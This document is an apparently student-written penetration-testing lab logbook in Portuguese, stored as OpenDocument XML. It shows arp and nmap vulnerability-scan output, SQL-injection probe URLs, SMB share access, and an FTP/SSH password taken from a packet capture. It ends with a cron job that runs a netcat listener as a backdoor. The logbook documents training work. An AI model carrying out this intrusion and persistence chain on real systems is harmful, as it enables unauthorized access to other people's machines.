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972cm" fo:margin-left="0cm" table:align="left"/>
    </style:style>
    <style:style style:name="Table1.A" style:family="table-column">
      <style:table-column-properties style:column-width="4.99cm"/>
    </style:style>
    <style:style style:name="Table1.C" style:family="table-column">
      <style:table-column-properties style:column-width="4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officeooo:rsid="0016a10f" officeooo:paragraph-rsid="0016a10f"/>
    </style:style>
    <style:style style:name="P3" style:family="paragraph" style:parent-style-name="Normal">
      <style:text-properties fo:language="en" fo:country="US" officeooo:rsid="0019232d" officeooo:paragraph-rsid="0019232d"/>
    </style:style>
    <style:style style:name="P4" style:family="paragraph" style:parent-style-name="Normal">
      <style:text-properties officeooo:rsid="001b7412" officeooo:paragraph-rsid="001b7412"/>
    </style:style>
    <style:style style:name="P5" style:family="paragraph" style:parent-style-name="Normal">
      <style:text-properties officeooo:rsid="001c0160" officeooo:paragraph-rsid="001c0160"/>
    </style:style>
    <style:style style:name="P6" style:family="paragraph" style:parent-style-name="Normal">
      <style:text-properties officeooo:rsid="00231d98" officeooo:paragraph-rsid="00231d98"/>
    </style:style>
    <style:style style:name="P7" style:family="paragraph" style:parent-style-name="Normal">
      <style:text-properties officeooo:rsid="002e4866" officeooo:paragraph-rsid="002e4866"/>
    </style:style>
    <style:style style:name="P8" style:family="paragraph" style:parent-style-name="Normal">
      <style:text-properties officeooo:rsid="002f6e67" officeooo:paragraph-rsid="002f6e67"/>
    </style:style>
    <style:style style:name="P9" style:family="paragraph" style:parent-style-name="Normal">
      <style:text-properties officeooo:rsid="001d6116" officeooo:paragraph-rsid="001d6116"/>
    </style:style>
    <style:style style:name="P10" style:family="paragraph" style:parent-style-name="Normal">
      <style:text-properties officeooo:paragraph-rsid="001f4429"/>
    </style:style>
    <style:style style:name="P11" style:family="paragraph" style:parent-style-name="Normal">
      <style:text-properties officeooo:rsid="0019232d" officeooo:paragraph-rsid="0019232d"/>
    </style:style>
    <style:style style:name="P12" style:family="paragraph" style:parent-style-name="Normal">
      <style:text-properties officeooo:rsid="003711df" officeooo:paragraph-rsid="003711df"/>
    </style:style>
    <style:style style:name="P13" style:family="paragraph" style:parent-style-name="Normal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officeooo:rsid="002f6e67"/>
    </style:style>
    <style:style style:name="T2" style:family="text">
      <style:text-properties officeooo:rsid="003711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ario de bordo </text:p>
      <text:p text:style-name="P2">Pedro Cunial Campos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Data:</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" table:number-columns-spanned="2" office:value-type="string">
            <text:p text:style-name="P3">05/03/2018</text:p>
          </table:table-cell>
          <table:covered-table-cell/>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="Normal">Dados de endereçamento do(s) alvo(s)</text:p>
          </table:table-cell>
          <table:table-cell table:style-name="Table1.A1" table:number-columns-spanned="2" office:value-type="string">
            <text:p text:style-name="P11">IP: 10.0.0.<text:span text:style-name="T2">254, 10.0.0.200</text:span></text:p>
            <text:p text:style-name="P12">ports: 10.0.0.200:445 (samba)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Normal">Dados coletados de Rede (Portas/serviços, topologia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Normal"/>
            <text:p text:style-name="Normal">intelbras-win240 (10.0.0.1) at 00:1a:3f:a2:be:12 [ether] on wlp2s0</text:p>
            <text:p text:style-name="Normal">? (10.0.0.105) at 38:b1:db:cc:cc:ed [ether] on wlp2s0</text:p>
            <text:p text:style-name="Normal">? (10.0.0.200) at 1c:65:9d:82:e4:1e [ether] on wlp2s0</text:p>
            <text:p text:style-name="Normal">? (10.0.0.254) at 1c:65:9d:82:e4:1e [ether] on wlp2s0</text:p>
            <text:p text:style-name="Normal">? (10.0.0.102) at 9c:b6:d0:e3:90:7b [ether] on wlp2s0</text:p>
            <text:p text:style-name="Normal"/>
            <text:p text:style-name="Normal">Starting Nmap 7.60 ( https://nmap.org ) at 2018-03-12 13:56 -03</text:p>
            <text:p text:style-name="Normal">Nmap scan report for 10.0.0.254</text:p>
            <text:p text:style-name="Normal">Host is up (0.017s latency).</text:p>
            <text:p text:style-name="Normal">Not shown: 993 closed ports</text:p>
            <text:p text:style-name="Normal">PORT <text:s text:c="3"/>STATE SERVICE <text:s text:c="4"/>VERSION</text:p>
            <text:p text:style-name="Normal">21/tcp <text:s/>open <text:s/>ftp <text:s text:c="8"/>ProFTPD 1.3.5</text:p>
            <text:p text:style-name="Normal">22/tcp <text:s/>open <text:s/>ssh <text:s text:c="8"/>OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)</text:p>
            <text:p text:style-name="Normal">53/tcp <text:s/>open <text:s/>domain</text:p>
            <text:p text:style-name="Normal">80/tcp <text:s/>open <text:s/>http <text:s text:c="7"/>Apache httpd 2.4.10</text:p>
            <text:p text:style-name="Normal">111/tcp open <text:s/>rpcbind <text:s text:c="4"/>2-4 (RPC #100000)</text:p>
            <text:p text:style-name="Normal">139/tcp open <text:s/>netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</text:p>
            <text:p text:style-name="Normal">445/tcp open <text:s/>netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</text:p>
            <text:p text:style-name="Normal">Service Info: Hosts: 127.0.1.1, DEBIAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</text:p>
            <text:p text:style-name="Normal"/>
            <text:p text:style-name="Normal">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</text:p>
            <text:p text:style-name="Normal">Nmap done: 1 IP address (1 host up) scanned in 26.37 seconds</text:p>
            <text:p text:style-name="Normal"/>
            <text:p text:style-name="Normal"/>
            <text:p text:style-name="Normal"><text:soft-page-break/></text:p>
            <text:p text:style-name="Normal">PORT <text:s text:c="3"/>STATE SERVICE <text:s text:c="4"/>VERSION</text:p>
            <text:p text:style-name="Normal">21/tcp <text:s/>open <text:s/>ftp <text:s text:c="8"/>ProFTPD 1.3.5</text:p>
            <text:p text:style-name="Normal">|_sslv2-drown: </text:p>
            <text:p text:style-name="Normal">22/tcp <text:s/>open <text:s/>ssh <text:s text:c="8"/>OpenSSH 6.7p1 Debian 5+deb8u3 (protocol 2.0)</text:p>
            <text:p text:style-name="Normal">53/tcp <text:s/>open <text:s/>domain</text:p>
            <text:p text:style-name="Normal">80/tcp <text:s/>open <text:s/>http <text:s text:c="7"/>Apache httpd 2.4.10</text:p>
            <text:p text:style-name="Normal">|_http-csrf: Couldn't find any CSRF vulnerabilities.</text:p>
            <text:p text:style-name="Normal">|_http-dombased-xss: Couldn't find any DOM based XSS.</text:p>
            <text:p text:style-name="Normal">| http-enum: </text:p>
            <text:p text:style-name="Normal">| <text:s text:c="2"/>/: Root directory w/ listing on 'apache/2.4.10 (debian)'</text:p>
            <text:p text:style-name="Normal">|_ <text:s/>/phpmyadmin/: phpMyAdmin</text:p>
            <text:p text:style-name="Normal">|_http-server-header: Apache/2.4.10 (Debian)</text:p>
            <text:p text:style-name="Normal">| http-slowloris-check: </text:p>
            <text:p text:style-name="Normal">| <text:s text:c="2"/>VULNERABLE:</text:p>
            <text:p text:style-name="Normal">| <text:s text:c="2"/>Slowloris DOS attack</text:p>
            <text:p text:style-name="Normal">| <text:s text:c="4"/>State: LIKELY VULNERABLE</text:p>
            <text:p text:style-name="Normal">| <text:s text:c="4"/>IDs: <text:s/>CVE:CVE-2007-6750</text:p>
            <text:p text:style-name="Normal">| <text:s text:c="6"/>Slowloris tries to keep many connections to the target web server open and hold</text:p>
            <text:p text:style-name="Normal">| <text:s text:c="6"/>them open as long as possible. <text:s/>It accomplishes this by opening connections to</text:p>
            <text:p text:style-name="Normal">| <text:s text:c="6"/>the target web server and sending a partial request. By doing so, it starves</text:p>
            <text:p text:style-name="Normal">| <text:s text:c="6"/>the http server's resources causing Denial Of Service.</text:p>
            <text:p text:style-name="Normal">| <text:s text:c="6"/></text:p>
            <text:p text:style-name="Normal">| <text:s text:c="4"/>Disclosure date: 2009-09-17</text:p>
            <text:p text:style-name="Normal">| <text:s text:c="4"/>References:</text:p>
            <text:p text:style-name="Normal">| <text:s text:c="6"/>http://ha.ckers.org/slowloris/</text:p>
            <text:p text:style-name="Normal">|_ <text:s text:c="5"/>https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-6750</text:p>
            <text:p text:style-name="Normal">| http-sql-injection: </text:p>
            <text:p text:style-name="Normal">| <text:s text:c="2"/>Possible sqli for queries:</text:p>
            <text:p text:style-name="Normal">| <text:s text:c="4"/>http://10.0.0.254/?C=D%3bO%3dA%27%20OR%20sqlspider</text:p>
            <text:p text:style-name="Normal">| <text:s text:c="4"/>http://10.0.0.254/?C=N%3bO%3dD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<text:soft-page-break/>%27%20OR%20sqlspider</text:p>
            <text:p text:style-name="Normal">| <text:s text:c="4"/>http://10.0.0.254/?C=D%3bO%3dD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| <text:s text:c="4"/>http://10.0.0.254/?C=D%3bO%3dA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| <text:s text:c="4"/>http://10.0.0.254/?C=M%3bO%3dD%27%20OR%20sqlspider</text:p>
            <text:p text:style-name="Normal">| <text:s text:c="4"/>http://10.0.0.254/?C=D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| <text:s text:c="4"/>http://10.0.0.254/?C=S%3bO%3dD%27%20OR%20sqlspider</text:p>
            <text:p text:style-name="Normal">| <text:s text:c="4"/>http://10.0.0.254/?C=M%3bO%3dA%27%20OR%20sqlspider</text:p>
            <text:p text:style-name="Normal">| <text:s text:c="4"/>http://10.0.0.254/?C=D%3bO%3dA%27%20OR%20sqlspider</text:p>
            <text:p text:style-name="Normal">| <text:s text:c="4"/>http://10.0.0.254/?C=D%3bO%3dA%27%20OR%20sqlspider</text:p>
            <text:p text:style-name="Normal">| <text:s text:c="4"/>http://10.0.0.254/?C=N%3bO%3dD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| <text:s text:c="4"/>http://10.0.0.254/?C=D%3bO%3dA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<text:soft-page-break/>| <text:s text:c="4"/>http://10.0.0.254/?C=D%3bO%3dA%27%20OR%20sqlspider</text:p>
            <text:p text:style-name="Normal">| <text:s text:c="4"/>http://10.0.0.254/?C=M%3bO%3dA%27%20OR%20sqlspider</text:p>
            <text:p text:style-name="Normal">| <text:s text:c="4"/>http://10.0.0.254/?C=S%3bO%3dA%27%20OR%20sqlspider</text:p>
            <text:p text:style-name="Normal">| <text:s text:c="4"/>http://10.0.0.254/?C=N%3bO%3dA%27%20OR%20sqlspider</text:p>
            <text:p text:style-name="Normal">| <text:s text:c="4"/>http://10.0.0.254/?C=D%3bO%3dA%27%20OR%20sqlspider</text:p>
            <text:p text:style-name="Normal">| <text:s text:c="4"/>http://10.0.0.254/?C=M%3bO%3dA%27%20OR%20sqlspider</text:p>
            <text:p text:style-name="Normal">|_ <text:s text:c="3"/>http://10.0.0.254/?C=S%3bO%3dA%27%20OR%20sqlspider</text:p>
            <text:p text:style-name="Normal">|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.</text:p>
            <text:p text:style-name="Normal">111/tcp open <text:s/>rpcbind <text:s text:c="4"/>2-4 (RPC #100000)</text:p>
            <text:p text:style-name="Normal">| rpcinfo: </text:p>
            <text:p text:style-name="Normal">| <text:s text:c="2"/>program version <text:s text:c="2"/>port/proto <text:s/>service</text:p>
            <text:p text:style-name="Normal">| <text:s text:c="2"/>100000 <text:s/>2,3,4 <text:s text:c="7"/>111/tcp <text:s/>rpcbind</text:p>
            <text:p text:style-name="Normal">| <text:s text:c="2"/>100000 <text:s/>2,3,4 <text:s text:c="7"/>111/udp <text:s/>rpcbind</text:p>
            <text:p text:style-name="Normal">| <text:s text:c="2"/>100024 <text:s/>1 <text:s text:c="9"/>54054/udp <text:s/>status</text:p>
            <text:p text:style-name="Normal">|_ <text:s/>100024 <text:s/>1 <text:s text:c="9"/>59128/tcp <text:s/>status</text:p>
            <text:p text:style-name="Normal">139/tcp open <text:s/>netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</text:p>
            <text:p text:style-name="Normal">445/tcp open <text:s/>netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)</text:p>
            <text:p text:style-name="Normal">Service Info: Hosts: 127.0.1.1, DEBIAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</text:p>
            <text:p text:style-name="Normal"/>
            <text:p text:style-name="Normal">Host script results:</text:p>
            <text:p text:style-name="Normal">|_smb-vuln-ms10-054: false</text:p>
            <text:p text:style-name="Normal">|_smb-vuln-ms10-061: false</text:p>
            <text:p text:style-name="Normal">| smb-vuln-regsvc-dos: </text:p>
            <text:p text:style-name="Normal">| <text:s text:c="2"/>VULNERABLE:</text:p>
            <text:p text:style-name="Normal">| <text:s text:c="2"/>Service regsvc in Microsoft Windows systems vulnerable to denial of service</text:p>
            <text:p text:style-name="Normal">| <text:s text:c="4"/>State: VULNERABLE</text:p>
            <text:p text:style-name="Normal">| <text:s text:c="6"/>The service regsvc in Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference</text:p>
            <text:p text:style-name="Normal">| <text:s text:c="6"/>pointer. This script will crash the service if it is vulnerable. This vulnerability was discovered by Ron Bowes</text:p>
            <text:p text:style-name="Normal">| <text:s text:c="6"/>while working on smb-enum-sessions.</text:p>
            <text:p text:style-name="Normal">|_ <text:s text:c="9"/></text:p>
            <text:p text:style-name="Normal"/>
            <text:p text:style-name="Normal">Service detection performed. Please report any incorrect results at <text:soft-page-break/>https://nmap.org/submit/ .</text:p>
            <text:p text:style-name="Normal">Nmap done: 1 IP address (1 host up) scanned in 370.46 seconds</text:p>
            <text:p text:style-name="Normal"/>
            <text:p text:style-name="Normal"/>
            <text:p text:style-name="P7">Utilizando o mesmo comando, identifiquei a porta 445 aberta no cliente (10.0.0.200) e me conectei utilizando o samba-client (smbclient) para acessar a home folder do mesmo. Nela encontrei as instruções para análisar um arquivo .pcap com as informações de conexões. Nele descobri que poderia me conectar por ftp no host (10.0.0.254) utilizando o login “<text:span text:style-name="T1">web” e a senha “1qazXSW@”.</text:span></text:p>
            <text:p text:style-name="P7"/>
            <text:p text:style-name="P8">Baixei o arquivo “Orientações” nessa máquina para a minha e ele sugeria que conectasse por ssh com o mesmo login e senha.</text:p>
            <text:p text:style-name="P8"/>
            <text:p text:style-name="P8"/>
            <text:p text:style-name="P8">Depois de conectado na máquina, utilizei o cron para agendar um script para as 23:00.</text:p>
            <text:p text:style-name="P8"/>
            <text:p text:style-name="P8">Conteúdo do script:</text:p>
            <text:p text:style-name="P8"/>
            <text:p text:style-name="P8">#!/bin/bash</text:p>
            <text:p text:style-name="P8">nc -lvp 6969</text:p>
            <text:p text:style-name="Normal"/>
          </table:table-cell>
          <table:covered-table-cell/>
          <table:table-cell table:style-name="Table1.A1" office:value-type="string">
            <text:p text:style-name="P5"/>
            <text:p text:style-name="P6">Arp -a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nmap -sV 10.0.0.254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>nmap -sV 10.0.0.254 --script vuln -p21,22,53,80,111,139,445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9"/>
            <text:p text:style-name="P9"/>
            <text:p text:style-name="P9"/>
            <text:p text:style-name="P9"/>
            <text:p text:style-name="P8">ftp 10.0.0.254</text:p>
            <text:p text:style-name="P8">user (abre comando para entrada de username e pwd)</text:p>
            <text:p text:style-name="P8"/>
            <text:p text:style-name="P8"/>
            <text:p text:style-name="P8"/>
            <text:p text:style-name="P8">get ./Orientacoes</text:p>
            <text:p text:style-name="P8"/>
            <text:p text:style-name="P8">ssh <text:a xlink:type="simple" xlink:href="mailto:web@10.0.0.254" text:style-name="Internet_20_link" text:visited-style-name="Visited_20_Internet_20_Link">web@10.0.0.254</text:a></text:p>
            <text:p text:style-name="P8">(pwd) 1qazXSW@</text:p>
            <text:p text:style-name="P8"/>
            <text:p text:style-name="P8"/>
            <text:p text:style-name="P8">crontab -e</text:p>
            <text:p text:style-name="P8">(dentro do arquivo do cron)</text:p>
            <text:p text:style-name="P8">0 23 * * * ~/pedrocc4.sh</text:p>
          </table:table-cell>
        </table:table-row>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A1" table:number-columns-spanned="2" office:value-type="string">
            <text:p text:style-name="Normal">ados coletados de aplicação (SO, versões de serviços..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4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3" office:value-type="string">
            <text:p text:style-name="Normal">Vulnerabilidades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10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Exploração</text:p>
          </table:table-cell>
          <table:covered-table-cell/>
          <table:covered-table-cell/>
        </table:table-row>
        <text:soft-page-break/>
        <table:table-row>
          <table:table-cell table:style-name="Table1.A1" table:number-columns-spanned="3" office:value-type="string"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Outras informações úteis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dc:description/>
    <dc:subject/>
    <meta:initial-creator>Rodolfo Avelino</meta:initial-creator>
    <meta:creation-date>2018-03-05T15:47:00Z</meta:creation-date>
    <dc:date>2018-03-12T15:16:50.541817241</dc:date>
    <meta:editing-cycles>12</meta:editing-cycles>
    <meta:editing-duration>PT50M8S</meta:editing-duration>
    <meta:document-statistic meta:table-count="1" meta:image-count="0" meta:object-count="0" meta:page-count="6" meta:paragraph-count="139" meta:word-count="713" meta:character-count="6629" meta:non-whitespace-character-count="5658"/>
    <meta:template xlink:type="simple" xlink:actuate="onRequest" xlink:title="" xlink:href="Normal.dotm"/>
  </office:meta>
</office:document-meta>
</file>